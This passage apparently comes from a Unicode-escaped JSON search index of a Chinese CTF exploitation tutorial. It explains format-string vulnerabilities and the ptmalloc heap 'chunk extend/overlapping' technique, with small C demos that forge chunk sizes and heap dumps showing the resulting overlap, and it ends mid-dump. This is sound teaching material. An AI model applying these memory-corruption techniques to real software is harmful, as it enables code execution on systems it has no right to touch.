\u7b2c\u4e00\u4e2a\u53c2\u6570\u4f5c\u4e3a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\uff0c\u6839\u636e\u5176\u6765\u89e3\u6790\u4e4b\u540e\u7684\u53c2\u6570 \u3002\u901a\u4fd7\u6765\u8bf4\uff0c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u51fd\u6570\u5c31\u662f\u5c06\u8ba1\u7b97\u673a\u5185\u5b58\u4e2d\u8868\u793a\u7684\u6570\u636e\u8f6c\u5316\u4e3a\u6211\u4eec\u4eba\u7c7b\u53ef\u8bfb\u7684\u5b57\u7b26\u4e32\u683c\u5f0f\u3002\u51e0\u4e4e\u6240\u6709\u7684C/C++\u7a0b\u5e8f\u90fd\u4f1a\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u51fd\u6570\u6765 \u8f93\u51fa\u4fe1\u606f\uff0c\u8c03\u8bd5\u7a0b\u5e8f\uff0c\u6216\u8005\u5904\u7406\u5b57\u7b26\u4e32 \u3002\u4e00\u822c\u6765\u8bf4\uff0c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5728\u5229\u7528\u7684\u65f6\u5019\u4e3b\u8981\u5206\u4e3a\u4e09\u4e2a\u90e8\u5206 \u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u51fd\u6570 \u683c\u5f0f\u5316\u5b57\u7b26\u4e32 \u540e\u7eed\u53c2\u6570\uff0c \u53ef\u9009 \u8fd9\u91cc\u6211\u4eec\u7ed9\u51fa\u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\uff0c\u5176\u5b9e\u76f8\u4fe1\u5927\u591a\u6570\u4eba\u90fd\u63a5\u89e6\u8fc7printf\u51fd\u6570\u4e4b\u7c7b\u7684\u3002\u4e4b\u540e\u6211\u4eec\u518d\u4e00\u4e2a\u4e00\u4e2a\u8fdb\u884c\u4ecb\u7ecd\u3002","title":"\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u51fd\u6570\u4ecb\u7ecd"},{"location":"pwn/fmtstr/fmtstr_intro/#_3","text":"\u5e38\u89c1\u7684\u6709\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u51fd\u6570\u6709 \u8f93\u5165 scanf \u8f93\u51fa \u51fd\u6570 \u57fa\u672c\u4ecb\u7ecd printf \u8f93\u51fa\u5230stdout fprintf \u8f93\u51fa\u5230\u6307\u5b9aFILE\u6d41 vprintf \u6839\u636e\u53c2\u6570\u5217\u8868\u683c\u5f0f\u5316\u8f93\u51fa\u5230 stdout vfprintf \u6839\u636e\u53c2\u6570\u5217\u8868\u683c\u5f0f\u5316\u8f93\u51fa\u5230\u6307\u5b9aFILE\u6d41 sprintf \u8f93\u51fa\u5230\u5b57\u7b26\u4e32 snprintf \u8f93\u51fa\u6307\u5b9a\u5b57\u8282\u6570\u5230\u5b57\u7b26\u4e32 vsprintf \u6839\u636e\u53c2\u6570\u5217\u8868\u683c\u5f0f\u5316\u8f93\u51fa\u5230\u5b57\u7b26\u4e32 vsnprintf \u6839\u636e\u53c2\u6570\u5217\u8868\u683c\u5f0f\u5316\u8f93\u51fa\u6307\u5b9a\u5b57\u8282\u5230\u5b57\u7b26\u4e32 setproctitle \u8bbe\u7f6eargv syslog \u8f93\u51fa\u65e5\u5fd7 err, verr, warn, vwarn\u7b49 \u3002\u3002\u3002","title":"\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u51fd\u6570"},{"location":"pwn/fmtstr/fmtstr_intro/#_4","text":"\u8fd9\u91cc\u6211\u4eec\u4e86\u89e3\u4e00\u4e0b\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u683c\u5f0f\uff0c\u5176\u57fa\u672c\u683c\u5f0f\u5982\u4e0b %[parameter][flags][field width][.precision][length]type \u6bcf\u4e00\u79cdpattern\u7684\u542b\u4e49\u8bf7\u5177\u4f53\u53c2\u8003\u7ef4\u57fa\u767e\u79d1\u7684 \u683c\u5f0f\u5316\u5b57\u7b26\u4e32 \u3002\u4ee5\u4e0b\u51e0\u4e2apattern\u4e2d\u7684\u5bf9\u5e94\u9009\u62e9\u9700\u8981\u91cd\u70b9\u5173\u6ce8 parameter n$\uff0c\u83b7\u53d6\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4e2d\u7684\u6307\u5b9a\u53c2\u6570 flag field width \u8f93\u51fa\u7684\u6700\u5c0f\u5bbd\u5ea6 precision \u8f93\u51fa\u7684\u6700\u5927\u957f\u5ea6 length\uff0c\u8f93\u51fa\u7684\u957f\u5ea6 hh\uff0c\u8f93\u51fa\u4e00\u4e2a\u5b57\u8282 h\uff0c\u8f93\u51fa\u4e00\u4e2a\u53cc\u5b57\u8282 \u200b type d/i\uff0c\u6709\u7b26\u53f7\u6574\u6570 u\uff0c\u65e0\u7b26\u53f7\u6574\u6570 x/X\uff0c16\u8fdb\u5236unsigned int \u3002x\u4f7f\u7528\u5c0f\u5199\u5b57\u6bcd\uff1bX\u4f7f\u7528\u5927\u5199\u5b57\u6bcd\u3002\u5982\u679c\u6307\u5b9a\u4e86\u7cbe\u5ea6\uff0c\u5219\u8f93\u51fa\u7684\u6570\u5b57\u4e0d\u8db3\u65f6\u5728\u5de6\u4fa7\u88650\u3002\u9ed8\u8ba4\u7cbe\u5ea6\u4e3a1\u3002\u7cbe\u5ea6\u4e3a0\u4e14\u503c\u4e3a0\uff0c\u5219\u8f93\u51fa\u4e3a\u7a7a\u3002 o\uff0c8\u8fdb\u5236unsigned int \u3002\u5982\u679c\u6307\u5b9a\u4e86\u7cbe\u5ea6\uff0c\u5219\u8f93\u51fa\u7684\u6570\u5b57\u4e0d\u8db3\u65f6\u5728\u5de6\u4fa7\u88650\u3002\u9ed8\u8ba4\u7cbe\u5ea6\u4e3a1\u3002\u7cbe\u5ea6\u4e3a0\u4e14\u503c\u4e3a0\uff0c\u5219\u8f93\u51fa\u4e3a\u7a7a\u3002 s\uff0c\u5982\u679c\u6ca1\u6709\u7528l\u6807\u5fd7\uff0c\u8f93\u51fanull\u7ed3\u5c3e\u5b57\u7b26\u4e32\u76f4\u5230\u7cbe\u5ea6\u89c4\u5b9a\u7684\u4e0a\u9650\uff1b\u5982\u679c\u6ca1\u6709\u6307\u5b9a\u7cbe\u5ea6\uff0c\u5219\u8f93\u51fa\u6240\u6709\u5b57\u8282\u3002\u5982\u679c\u7528\u4e86l\u6807\u5fd7\uff0c\u5219\u5bf9\u5e94\u51fd\u6570\u53c2\u6570\u6307\u5411wchar_t\u578b\u7684\u6570\u7ec4\uff0c\u8f93\u51fa\u65f6\u628a\u6bcf\u4e2a\u5bbd\u5b57\u7b26\u8f6c\u5316\u4e3a\u591a\u5b57\u8282\u5b57\u7b26\uff0c\u76f8\u5f53\u4e8e\u8c03\u7528wcrtomb \u51fd\u6570\u3002 c\uff0c\u5982\u679c\u6ca1\u6709\u7528l\u6807\u5fd7\uff0c\u628aint\u53c2\u6570\u8f6c\u4e3aunsigned char\u578b\u8f93\u51fa\uff1b\u5982\u679c\u7528\u4e86l\u6807\u5fd7\uff0c\u628awint_t\u53c2\u6570\u8f6c\u4e3a\u5305\u542b\u4e24\u4e2a\u5143\u7d20\u7684wchart_t\u6570\u7ec4\uff0c\u5176\u4e2d\u7b2c\u4e00\u4e2a\u5143\u7d20\u5305\u542b\u8981\u8f93\u51fa\u7684\u5b57\u7b26\uff0c\u7b2c\u4e8c\u4e2a\u5143\u7d20\u4e3anull\u5bbd\u5b57\u7b26\u3002 p\uff0c void *\u578b\uff0c\u8f93\u51fa\u5bf9\u5e94\u53d8\u91cf\u7684\u503c\u3002printf(\"%p\",a)\u7528\u5730\u5740\u7684\u683c\u5f0f\u6253\u5370\u53d8\u91cfa\u7684\u503c\uff0cprintf(\"%p\", &a)\u6253\u5370\u53d8\u91cfa\u6240\u5728\u7684\u5730\u5740\u3002 n\uff0c\u4e0d\u8f93\u51fa\u5b57\u7b26\uff0c\u4f46\u662f\u628a\u5df2\u7ecf\u6210\u529f\u8f93\u51fa\u7684\u5b57\u7b26\u4e2a\u6570\u5199\u5165\u5bf9\u5e94\u7684\u6574\u578b\u6307\u9488\u53c2\u6570\u6240\u6307\u7684\u53d8\u91cf\u3002 %\uff0c ' % '\u5b57\u9762\u503c\uff0c\u4e0d\u63a5\u53d7\u4efb\u4f55flags, width\u3002","title":"\u683c\u5f0f\u5316\u5b57\u7b26\u4e32"},{"location":"pwn/fmtstr/fmtstr_intro/#_5","text":"\u5c31\u662f\u76f8\u5e94\u7684\u8981\u8f93\u51fa\u7684\u53d8\u91cf\u3002","title":"\u53c2\u6570"},{"location":"pwn/fmtstr/fmtstr_intro/#_6","text":"\u5728\u4e00\u5f00\u59cb\uff0c\u6211\u4eec\u5c31\u7ed9\u51fa\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u57fa\u672c\u4ecb\u7ecd\uff0c\u8fd9\u91cc\u518d\u8bf4\u4e00\u4e9b\u6bd4\u8f83\u7ec6\u81f4\u7684\u5185\u5bb9\u3002\u6211\u4eec\u4e0a\u9762\u8bf4\uff0c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u51fd\u6570\u662f\u6839\u636e\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u51fd\u6570\u6765\u8fdb\u884c\u89e3\u6790\u7684\u3002 \u90a3\u4e48\u76f8\u5e94\u7684\u8981\u88ab\u89e3\u6790\u7684\u53c2\u6570\u7684\u4e2a\u6570\u4e5f\u81ea\u7136\u662f\u7531\u8fd9\u4e2a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6240\u63a7\u5236 \u3002\u6bd4\u5982\u8bf4'%s'\u8868\u660e\u6211\u4eec\u4f1a\u8f93\u51fa\u4e00\u4e2a\u5b57\u7b26\u4e32\u53c2\u6570\u3002 \u6211\u4eec\u518d\u7ee7\u7eed\u4ee5\u4e0a\u9762\u7684\u4e3a\u4f8b\u5b50\u8fdb\u884c\u4ecb\u7ecd \u5bf9\u4e8e\u8fd9\u6837\u7684\u4f8b\u5b50\uff0c\u5728\u8fdb\u5165printf\u51fd\u6570\u7684\u4e4b\u524d(\u5373\u8fd8\u6ca1\u6709\u8c03\u7528printf)\uff0c\u6808\u4e0a\u7684\u5e03\u5c40\u7531\u9ad8\u5730\u5740\u5230\u4f4e\u5730\u5740\u4f9d\u6b21\u5982\u4e0b some value 3.14 123456 addr of \"red\" addr of format string: Color %s... \u6ce8\uff1a\u8fd9\u91cc\u6211\u4eec\u5047\u8bbe3.14\u4e0a\u9762\u7684\u503c\u4e3a\u67d0\u4e2a\u672a\u77e5\u7684\u503c\u3002 \u5728\u8fdb\u5165printf\u4e4b\u540e\uff0c\u51fd\u6570\u9996\u5148\u83b7\u53d6\u7b2c\u4e00\u4e2a\u53c2\u6570\uff0c\u4e00\u4e2a\u4e00\u4e2a\u8bfb\u53d6\u5176\u5b57\u7b26\u4f1a\u9047\u5230\u4e24\u79cd\u60c5\u51b5 \u5f53\u524d\u5b57\u7b26\u4e0d\u662f%\uff0c\u76f4\u63a5\u8f93\u51fa\u5230\u76f8\u5e94\u6807\u51c6\u8f93\u51fa\u3002 \u5f53\u524d\u5b57\u7b26\u662f%\uff0c \u7ee7\u7eed\u8bfb\u53d6\u4e0b\u4e00\u4e2a\u5b57\u7b26 \u5982\u679c\u6ca1\u6709\u5b57\u7b26\uff0c\u62a5\u9519 \u5982\u679c\u4e0b\u4e00\u4e2a\u5b57\u7b26\u662f%,\u8f93\u51fa% \u5426\u5219\u6839\u636e\u76f8\u5e94\u7684\u5b57\u7b26\uff0c\u83b7\u53d6\u76f8\u5e94\u7684\u53c2\u6570\uff0c\u5bf9\u5176\u8fdb\u884c\u89e3\u6790\u5e76\u8f93\u51fa \u90a3\u4e48\u5047\u8bbe\uff0c\u6b64\u65f6\u6211\u4eec\u5728\u7f16\u5199\u7a0b\u5e8f\u65f6\u5019\uff0c\u5199\u6210\u4e86\u4e0b\u9762\u7684\u6837\u5b50 printf ( \"Color %s, Number %d, Float %4.2f\" ); \u6b64\u65f6\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\u6211\u4eec\u5e76\u6ca1\u6709\u63d0\u4f9b\u53c2\u6570\uff0c\u90a3\u4e48\u7a0b\u5e8f\u4f1a\u5982\u4f55\u8fd0\u884c\u5462\uff1f\u7a0b\u5e8f\u7167\u6837\u4f1a\u8fd0\u884c\uff0c\u4f1a\u5c06\u6808\u4e0a\u5b58\u50a8\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5730\u5740\u4e0a\u9762\u7684\u4e09\u4e2a\u53d8\u91cf\u5206\u522b\u89e3\u6790\u4e3a \u89e3\u6790\u5176\u5730\u5740\u5bf9\u5e94\u7684\u5b57\u7b26\u4e32 \u89e3\u6790\u5176\u5185\u5bb9\u5bf9\u5e94\u7684\u6574\u5f62\u503c \u89e3\u6790\u5176\u5185\u5bb9\u5bf9\u5e94\u7684\u6d6e\u70b9\u503c \u5bf9\u4e8e2\uff0c3\u6765\u8bf4\u5012\u8fd8\u65e0\u59a8\uff0c\u4f46\u662f\u5bf9\u4e8e\u5bf9\u4e8e1\u6765\u8bf4\uff0c\u5982\u679c\u63d0\u4f9b\u4e86\u4e00\u4e2a\u4e0d\u53ef\u8bbf\u95ee\u5730\u5740\uff0c\u6bd4\u59820\uff0c\u90a3\u4e48\u7a0b\u5e8f\u5c31\u4f1a\u56e0\u6b64\u800c\u5d29\u6e83\u3002 \u8fd9\u57fa\u672c\u5c31\u662f\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u7684\u57fa\u672c\u539f\u7406\u4e86\u3002","title":"\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u539f\u7406"},{"location":"pwn/fmtstr/fmtstr_intro/#_7","text":"https://zh.wikipedia.org/wiki/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2","title":"\u53c2\u8003\u9605\u8bfb"},{"location":"pwn/heap/chunk_extend_overlapping/","text":"Chunk Extend and Overlapping \u00b6 \u4ecb\u7ecd \u00b6 chunk extend\u662f\u5806\u6f0f\u6d1e\u7684\u4e00\u79cd\u5e38\u89c1\u5229\u7528\u624b\u6cd5\uff0c\u901a\u8fc7extend\u53ef\u4ee5\u5b9e\u73b0chunk overlapping\u7684\u6548\u679c\u3002\u8fd9\u79cd\u5229\u7528\u65b9\u6cd5\u9700\u8981\u4ee5\u4e0b\u7684\u65f6\u673a\u548c\u6761\u4ef6\uff1a \u7a0b\u5e8f\u4e2d\u5b58\u5728\u57fa\u4e8e\u5806\u7684\u6f0f\u6d1e \u6f0f\u6d1e\u53ef\u4ee5\u63a7\u5236 chunk header \u4e2d\u7684\u6570\u636e \u539f\u7406 \u00b6 chunk extend\u6280\u672f\u80fd\u591f\u4ea7\u751f\u7684\u539f\u56e0\u5728\u4e8eptmalloc\u5728\u5bf9\u5806chunk\u8fdb\u884c\u64cd\u4f5c\u65f6\u4f7f\u7528\u7684\u5404\u79cd\u5b8f\u3002 \u5728ptmalloc\u4e2d\uff0c\u83b7\u53d6 chunk \u5757\u5927\u5c0f\u7684\u64cd\u4f5c\u5982\u4e0b /* Get size, ignoring use bits */ #define chunksize(p) (chunksize_nomask(p) & ~(SIZE_BITS)) /* Like chunksize, but do not mask SIZE_BITS. */ #define chunksize_nomask(p) ((p)->mchunk_size) \u4e00\u79cd\u662f\u76f4\u63a5\u83b7\u53d6 chunk \u7684\u5927\u5c0f\uff0c\u4e0d\u5ffd\u7565\u63a9\u7801\u90e8\u5206\uff0c\u53e6\u5916\u4e00\u79cd\u662f\u5ffd\u7565\u63a9\u7801\u90e8\u5206\u3002 \u5728 ptmalloc \u4e2d\uff0c\u83b7\u53d6\u4e0b\u4e00 chunk \u5757\u5730\u5740\u7684\u64cd\u4f5c\u5982\u4e0b /* Ptr to next physical malloc_chunk. */ #define next_chunk(p) ((mchunkptr)(((char *) (p)) + chunksize(p))) \u5373\u4f7f\u7528\u5f53\u524d\u5757\u6307\u9488\u52a0\u4e0a\u5f53\u524d\u5757\u5927\u5c0f\u3002 \u5728 ptmalloc \u4e2d\uff0c\u83b7\u53d6\u524d\u4e00\u4e2a chunk \u4fe1\u606f\u7684\u64cd\u4f5c\u5982\u4e0b /* Size of the chunk below P. Only valid if prev_inuse (P). */ #define prev_size(p) ((p)->mchunk_prev_size) /* Ptr to previous physical malloc_chunk. Only valid if prev_inuse (P). */ #define prev_chunk(p) ((mchunkptr)(((char *) (p)) - prev_size(p))) \u5373\u901a\u8fc7malloc_chunk->prev_size\u83b7\u53d6\u524d\u4e00\u5757\u5927\u5c0f\uff0c\u7136\u540e\u4f7f\u7528\u672c chunk \u5730\u5740\u51cf\u53bb\u6240\u5f97\u5927\u5c0f\u3002 \u5728 ptmalloc\uff0c\u5224\u65ad\u5f53\u524d chunk \u662f\u5426\u662fuse\u72b6\u6001\u7684\u64cd\u4f5c\u5982\u4e0b\uff1a #define inuse(p) ((((mchunkptr)(((char *) (p)) + chunksize(p)))->mchunk_size) & PREV_INUSE) \u5373\u67e5\u770b\u4e0b\u4e00 chunk \u7684 prev_inuse \u57df\uff0c\u800c\u4e0b\u4e00\u5757\u5730\u5740\u53c8\u5982\u6211\u4eec\u524d\u9762\u6240\u8ff0\u662f\u6839\u636e\u5f53\u524d chunk \u7684 size \u8ba1\u7b97\u5f97\u51fa\u7684\u3002 \u66f4\u591a\u7684\u64cd\u4f5c\u8be6\u89c1 \u5806\u76f8\u5173\u6570\u636e\u7ed3\u6784 \u4e00\u8282\u3002 \u901a\u8fc7\u4e0a\u9762\u51e0\u4e2a\u5b8f\u53ef\u4ee5\u770b\u51fa\uff0cptmalloc\u901a\u8fc7chunk header\u7684\u6570\u636e\u5224\u65adchunk\u7684\u4f7f\u7528\u60c5\u51b5\u548c\u5bf9chunk\u7684\u524d\u540e\u5757\u8fdb\u884c\u5b9a\u4f4d\u3002\u7b80\u800c\u8a00\u4e4b\uff0cchunk extend\u5c31\u662f\u901a\u8fc7\u63a7\u5236size\u548cpre_size\u57df\u6765\u5b9e\u73b0\u8de8\u8d8a\u5757\u64cd\u4f5c\u4ece\u800c\u5bfc\u81f4overlapping\u7684\u3002 \u4e0echunk extend\u7c7b\u4f3c\u7684\u8fd8\u6709\u4e00\u79cd\u79f0\u4e3achunk shrink\u7684\u64cd\u4f5c\u3002\u8fd9\u91cc\u53ea\u4ecb\u7ecdchunk extend\u7684\u5229\u7528\u3002 \u57fa\u672c\u793a\u4f8b1\uff1a\u5bf9inuse\u7684fastbin\u8fdb\u884cextend \u00b6 \u7b80\u5355\u6765\u8bf4\uff0c\u8be5\u5229\u7528\u7684\u6548\u679c\u662f\u901a\u8fc7\u66f4\u6539\u7b2c\u4e00\u4e2a\u5757\u7684\u5927\u5c0f\u6765\u63a7\u5236\u7b2c\u4e8c\u4e2a\u5757\u7684\u5185\u5bb9\u3002 \u6ce8\u610f\uff0c\u6211\u4eec\u7684\u793a\u4f8b\u90fd\u662f\u572864\u4f4d\u7684\u7a0b\u5e8f\u3002\u5982\u679c\u60f3\u572832\u4f4d\u4e0b\u8fdb\u884c\u6d4b\u8bd5\uff0c\u53ef\u4ee5\u628a8\u5b57\u8282\u504f\u79fb\u6539\u4e3a4\u5b57\u8282 \u3002 int main(void) { void *ptr,*ptr1; ptr=malloc(0x10);//\u5206\u914d\u7b2c\u4e00\u4e2a0x10\u7684chunk malloc(0x10);//\u5206\u914d\u7b2c\u4e8c\u4e2a0x10\u7684chunk *(long long *)((long long)ptr-0x8)=0x41;// \u4fee\u6539\u7b2c\u4e00\u4e2a\u5757\u7684size\u57df free(ptr); ptr1=malloc(0x30);// \u5b9e\u73b0 extend\uff0c\u63a7\u5236\u4e86\u7b2c\u4e8c\u4e2a\u5757\u7684\u5185\u5bb9 return 0; } \u5f53\u4e24\u4e2amalloc\u8bed\u53e5\u6267\u884c\u4e4b\u540e\uff0c\u5806\u7684\u5185\u5b58\u5206\u5e03\u5982\u4e0b 0x602000: 0x0000000000000000 0x0000000000000021 <=== chunk 1 0x602010: 0x0000000000000000 0x0000000000000000 0x602020: 0x0000000000000000 0x0000000000000021 <=== chunk 2 0x602030: 0x0000000000000000 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000020fc1 <=== top chunk \u4e4b\u540e\uff0c\u6211\u4eec\u628a chunk1 \u7684 size \u57df\u66f4\u6539\u4e3a 0x41\uff0c0x41 \u662f\u56e0\u4e3a chunk \u7684 size \u57df\u5305\u542b\u4e86\u7528\u6237\u63a7\u5236\u7684\u5927\u5c0f\u548c header \u7684\u5927\u5c0f\u3002\u5982\u4e0a\u6240\u793a\u6b63\u597d\u5927\u5c0f\u4e3a0x40\u3002\u5728\u9898\u76ee\u4e2d\u8fd9\u4e00\u6b65\u53ef\u4ee5\u7531\u5806\u6ea2\u51fa\u5f97\u5230\u3002 0x602000: 0x0000000000000000 0x0000000000000041 <=== \u7be1\u6539\u5927\u5c0f 0x602010: 0x0000000000000000 0x0000000000000000 0x602020: 0x0000000000000000 0x0000000000000021 0x602030: 0x0000000000000000 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000020fc1 \u6267\u884c free \u4e4b\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230 chunk2 \u4e0e chunk1 \u5408\u6210\u4e00\u4e2a 0x40 \u5927\u5c0f\u7684 chunk\uff0c\u4e00\u8d77\u91ca\u653e\u4e86\u3002 Fastbins[idx=0, size=0x10] 0x00 Fastbins[idx=1, size=0x20] 0x00 Fastbins[idx=2, size=0x30] \u2190 Chunk(addr=0x602010, size=0x40, flags=PREV_INUSE) Fastbins[idx=3, size=0x40] 0x00 Fastbins[idx=4, size=0x50] 0x00 Fastbins[idx=5, size=0x60] 0x00 Fastbins[idx=6, size=0x70] 0x00 \u4e4b\u540e\u6211\u4eec\u901a\u8fc7 malloc(0x30) \u5f97\u5230 chunk1+chunk2 \u7684\u5757\uff0c\u6b64\u65f6\u5c31\u53ef\u4ee5\u76f4\u63a5\u63a7\u5236chunk2\u4e2d\u7684\u5185\u5bb9\uff0c\u6211\u4eec\u4e5f\u628a\u8fd9\u79cd\u72b6\u6001\u79f0\u4e3a overlapping chunk\u3002 call 0x400450 <malloc@plt> mov QWORD PTR [rbp-0x8], rax rax = 0x602010 \u57fa\u672c\u793a\u4f8b2\uff1a\u5bf9inuse\u7684smallbin\u8fdb\u884cextend \u00b6 \u901a\u8fc7\u4e4b\u524d\u6df1\u5165\u7406\u89e3\u5806\u7684\u5b9e\u73b0\u90e8\u5206\u7684\u5185\u5bb9\uff0c\u6211\u4eec\u5f97\u77e5\u5904\u4e8e fastbin \u8303\u56f4\u7684 chunk \u91ca\u653e\u540e\u4f1a\u88ab\u7f6e\u5165 fastbin \u94fe\u8868\u4e2d\uff0c\u800c\u4e0d\u5904\u4e8e\u8fd9\u4e2a\u8303\u56f4\u7684 chunk \u88ab\u91ca\u653e\u540e\u4f1a\u88ab\u7f6e\u4e8eunsorted bin\u94fe\u8868\u4e2d\u3002 \u4ee5\u4e0b\u8fd9\u4e2a\u793a\u4f8b\u4e2d\uff0c\u6211\u4eec\u4f7f\u7528 0x80 \u8fd9\u4e2a\u5927\u5c0f\u6765\u5206\u914d\u5806\uff08\u4f5c\u4e3a\u5bf9\u6bd4\uff0cfastbin \u9ed8\u8ba4\u7684\u6700\u5927\u7684 chunk \u53ef\u4f7f\u7528\u8303\u56f4\u662f0x70\uff09 int main() { void *ptr,*ptr1; ptr=malloc(0x80);//\u5206\u914d\u7b2c\u4e00\u4e2a 0x80 \u7684chunk1 malloc(0x10); //\u5206\u914d\u7b2c\u4e8c\u4e2a 0x10 \u7684chunk2 malloc(0x10); //\u9632\u6b62\u4e0etop chunk\u5408\u5e76 *(int *)((int)ptr-0x8)=0xb1; free(ptr); ptr1=malloc(0xa0); } \u5728\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\uff0c\u56e0\u4e3a\u5206\u914d\u7684 size \u4e0d\u5904\u4e8e fastbin \u7684\u8303\u56f4\uff0c\u56e0\u6b64\u5728\u91ca\u653e\u65f6\u5982\u679c\u4e0e top chunk \u76f8\u8fde\u4f1a\u5bfc\u81f4\u548ctop chunk\u5408\u5e76\u3002\u6240\u4ee5\u6211\u4eec\u9700\u8981\u989d\u5916\u5206\u914d\u4e00\u4e2achunk\uff0c\u628a\u91ca\u653e\u7684\u5757\u4e0etop chunk\u9694\u5f00\u3002 0x602000: 0x0000000000000000 0x00000000000000b1 <===chunk1 \u7be1\u6539size\u57df 0x602010: 0x0000000000000000 0x0000000000000000 0x602020: 0x0000000000000000 0x0000000000000000 0x602030: 0x0000000000000000 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000000000 0x602050: 0x0000000000000000 0x0000000000000000 0x602060: 0x0000000000000000 0x0000000000000000 0x602070: 0x0000000000000000 0x0000000000000000 0x602080: 0x0000000000000000 0x0000000000000000 0x602090: 0x0000000000000000 0x0000000000000021 <=== chunk2 0x6020a0: 0x0000000000000000 0x0000000000000000 0x6020b0: 0x0000000000000000 0x0000000000000021 <=== \u9632\u6b62\u5408\u5e76\u7684chunk 0x6020c0: 0x0000000000000000 0x0000000000000000 0x6020d0: 0x0000000000000000 0x0000000000020f31 <=== top chunk \u91ca\u653e\u540e\uff0cchunk1 \u628a chunk2 \u7684\u5185\u5bb9\u541e\u5e76\u6389\u5e76\u4e00\u8d77\u7f6e\u5165unsorted bin 0x602000: 0x0000000000000000 0x00000000000000b1 <=== \u88ab\u653e\u5165unsorted bin 0x602010: 0x00007ffff7dd1b78 0x00007ffff7dd1b78 0x602020: 0x0000000000000000 0x0000000000000000 0x602030: 0x0000000000000000 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000000000 0x602050: 0x0000000000000000 0x0000000000000000 0x602060: 0x0000000000000000 0x0000000000000000 0x602070: 0x0000000000000000 0x0000000000000000 0x602080: 0x0000000000000000 0x0000000000000000 0x602090: 0x0000000000000000 0x0000000000000021 0x6020a0: 0x0000000000000000 0x0000000000000000 0x6020b0: 0x00000000000000b0 0x0000000000000020 <=== \u6ce8\u610f\u6b64\u5904\u6807\u8bb0\u4e3a\u7a7a 0x6020c0: 0x0000000000000000 0x0000000000000000 0x6020d0: 0x0000000000000000 0x0000000000020f31 <=== top chunk [+] unsorted_bins[0]: fw=0x602000, bk=0x602000 \u2192 Chunk(addr=0x602010, size=0xb0, flags=PREV_INUSE) \u518d\u6b21\u8fdb\u884c\u5206\u914d\u7684\u65f6\u5019\u5c31\u4f1a\u53d6\u56de chunk1 \u548c chunk2 \u7684\u7a7a\u95f4\uff0c\u6b64\u65f6\u6211\u4eec\u5c31\u53ef\u4ee5\u63a7\u5236 chunk2 \u4e2d\u7684\u5185\u5bb9 0x4005b0 <main+74> call 0x400450 <malloc@plt> \u2192 0x4005b5 <main+79> mov QWORD PTR [rbp-0x8], rax rax : 0x0000000000602010 \u57fa\u672c\u793a\u4f8b3\uff1a\u5bf9free\u7684smallbin\u8fdb\u884cextend \u00b6 \u793a\u4f8b3\u662f\u5728\u793a\u4f8b2\u7684\u57fa\u7840\u4e0a\u8fdb\u884c\u7684\uff0c\u8fd9\u6b21\u6211\u4eec\u5148\u91ca\u653e chunk1\uff0c\u7136\u540e\u518d\u4fee\u6539\u5904\u4e8e unsorted bin \u4e2d\u7684 chunk1 \u7684size\u57df\u3002 int main() { void *ptr,*ptr1; ptr=malloc(0x80);//\u5206\u914d\u7b2c\u4e00\u4e2a0x80\u7684chunk1 malloc(0x10);//\u5206\u914d\u7b2c\u4e8c\u4e2a0x10\u7684chunk2 free(ptr);//\u9996\u5148\u8fdb\u884c\u91ca\u653e\uff0c\u4f7f\u5f97chunk1\u8fdb\u5165unsorted bin *(int *)((int)ptr-0x8)=0xb1; ptr1=malloc(0xa0); } \u4e24\u6b21 malloc \u4e4b\u540e\u7684\u7ed3\u679c\u5982\u4e0b 0x602000: 0x0000000000000000 0x0000000000000091 <=== chunk 1 0x602010: 0x0000000000000000 0x0000000000000000 0x602020: 0x0000000000000000 0x0000000000000000 0x602030: 0x0000000000000000 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000000000 0x602050: 0x0000000000000000 0x0000000000000000 0x602060: 0x0000000000000000 0x0000000000000000 0x602070: 0x0000000000000000 0x0000000000000000 0x602080: 0x0000000000000000 0x0000000000000000 0x602090: 0x0000000000000000 0x0000000000000021 <=== chunk 2 0x6020a0: 0x0000000000000000 0x0000000000000000 0x6020b0: 0x0000000000000000 0x0000000000020f51 \u6211\u4eec\u9996\u5148\u91ca\u653echunk1\u4f7f\u5b83\u8fdb\u5165unsorted bin\u4e2d unsorted_bins[0]: fw=0x602000, bk=0x602000 \u2192 Chunk(addr=0x602010, size=0x90, flags=PREV_INUSE) 0x602000: 0x0000000000000000 0x0000000000000091 <=== \u8fdb\u5165unsorted bin 0x602010: 0x00007ffff7dd1b78 0x00007ffff7dd1b78 0x602020: 0x0000000000000000 0x0000000000000000 0x602030: 0x0000000000000000 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000000000 0x602050: 0x0000000000000000 0x0000000000000000 0x602060: 0x0000000000000000 0x0000000000000000 0x602070: 0x0000000000000000 0x0000000000000000 0x602080: 0x0000000000000000 0x0000000000000000 0x602090: 0x0000000000000090 0x0000000000000020 <=== chunk 2 0x6020a0: 0x0000000000000000 0x0000000000000000 0x6020b0: 0x0000000000000000 0x0000000000020f51 <=== top chunk \u7136\u540e\u7be1\u6539chunk1\u7684size\u57df 0x602000: 0x0000000000000000 0x00000000000000b1 <=== size\u57df\u88ab\u7be1\u6539 0x602010: 0x00007ffff7dd1b78 